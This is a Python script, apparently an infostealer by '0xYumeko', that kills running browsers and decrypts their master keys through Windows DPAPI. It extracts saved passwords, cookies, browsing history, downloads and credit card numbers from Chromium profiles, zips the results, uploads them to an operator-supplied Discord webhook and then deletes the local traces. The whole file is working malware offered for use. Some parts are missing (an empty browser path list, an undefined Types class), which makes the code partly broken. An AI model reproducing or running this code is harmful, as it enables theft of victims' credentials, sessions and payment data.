import base64
import json
import os
import shutil
import sqlite3
import subprocess
import re
import uuid
import requests
import wmi
import psutil
from pathlib import Path
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# Colors for terminal output
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'

print(f'''
{Colors.GREEN}
              ========================
                  By 0xYumeko
              ========================
{Colors.END}
''')

# Had variables ghan7tajo bech nkhodjo data
LOGINS = []
COOKIES = []
WEB_HISTORY = []
DOWNLOADS = []
CARDS = []

class Done:
    def __init__(self, discord_webhook_url):
        self.discord_webhook_url = discord_webhook_url
        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs("result", exist_ok=True)
        os.makedirs("result\\cookies", exist_ok=True)

        if LOGINS:
            with open("result\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in LOGINS))

        if COOKIES:
            with open("result\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in COOKIES))
            
            for cookie in COOKIES:
                file_name = f"host{cookie.host}.txt"
                with open(f"result\\cookies\\{file_name}", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in COOKIES if x.host == cookie.host))

        if WEB_HISTORY:
            with open("result\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in WEB_HISTORY))

        if DOWNLOADS:
            with open("result\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in DOWNLOADS))

        if CARDS:
            with open("result\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in CARDS))

        shutil.make_archive("result", 'zip', "result")

    def send(self):
        print(f"{Colors.BLUE}Sending data to Discord webhook...{Colors.END}")
        with open("result.zip", 'rb') as file:
            response = requests.post(self.discord_webhook_url, files={'file': ('result.zip', file)})
        
        if response.status_code == 204:
            print(f"{Colors.GREEN}Data sent successfully to Discord.{Colors.END}")
        else:
            print(f"{Colors.FAIL}Failed to send data to Discord. Status code: {response.status_code}{Colors.END}")

    def clean(self):
        print(f"{Colors.WARNING}Cleaning up files...{Colors.END}")
        shutil.rmtree("result")
        os.remove("result.zip")

def close_browser_processes(browser_name):
    try:
        for proc in psutil.process_iter(attrs=['pid', 'name']):
            if proc.info['name'] == browser_name:
                proc.kill()
                print(f"{Colors.GREEN}Closed process: {browser_name}{Colors.END}")
    except Exception as e:
        print(f"{Colors.FAIL}Error closing process {browser_name}: {e}{Colors.END}")

class Walkthrough:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            # Browser paths (same as before)
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
            'Person 1',
            'Person 2',
            'Person 3',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        print(f"{Colors.FAIL}Error processing {profile}: {e}{Colors.END}")

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        try:
            with sqlite3.connect(login_db) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2]:
                        continue

                    password = self.decrypt_password(row[2], self.master_key)
                    LOGINS.append(Types.Login(row[0], row[1], password))
        except Exception as e:
            print(f"{Colors.FAIL}Error getting login data: {e}{Colors.END}")

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        try:
            with sqlite3.connect(cookie_db) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue

                    cookie = self.decrypt_password(row[3], self.master_key)
                    COOKIES.append(Types.Cookie(row[0], row[1], row[2], cookie, row[4]))

        except Exception as e:
            print(f"{Colors.FAIL}Error getting cookies: {e}{Colors.END}")

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        try:
            with sqlite3.connect(web_history_db) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT url, title, last_visit_time FROM urls')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2]:
                        continue

                    WEB_HISTORY.append(Types.WebHistory(row[0], row[1], row[2]))

        except Exception as e:
            print(f"{Colors.FAIL}Error getting web history: {e}{Colors.END}")

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        try:
            with sqlite3.connect(downloads_db) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT tab_url, target_path FROM downloads')
                for row in cursor.fetchall():
                    if not row[0] or not row[1]:
                        continue

                    DOWNLOADS.append(Types.Download(row[0], row[1]))

        except Exception as e:
            print(f"{Colors.FAIL}Error getting downloads: {e}{Colors.END}")

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        try:
            with sqlite3.connect(cards_db) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue

                    card_number = self.decrypt_password(row[3], self.master_key)
                    CARDS.append(Types.Card(row[0], row[1], row[2], card_number))

        except Exception as e:
            print(f"{Colors.FAIL}Error getting credit card data: {e}{Colors.END}")

def close_browser_processes(browser_name):
    try:
        for proc in psutil.process_iter(attrs=['pid', 'name']):
            if proc.info['name'] == browser_name:
                proc.kill()
                print(f"{Colors.GREEN}Closed process: {browser_name}{Colors.END}")
    except Exception as e:
        print(f"{Colors.FAIL}Error closing process {browser_name}: {e}{Colors.END}")

def main():
    discord_webhook_url = input(f"{Colors.WARNING}3afak ktb Discord Webhook URL:{Colors.END} ")
    
    browsers_to_close = [
        "brave.exe", "iexplore.exe", "opera.exe", "safari.exe", "firefox.exe",
        "chrome.exe", "msedge.exe", "vivaldi.exe", "7Star.exe", "torch.exe",
        "Sputnik.exe", "browser.exe", "CentBrowser.exe", "amigo.exe"
    ]
    for browser in browsers_to_close:
        close_browser_processes(browser)
    
    Walkthrough()
    Done(discord_webhook_url)

if __name__ == '__main__':
    main()
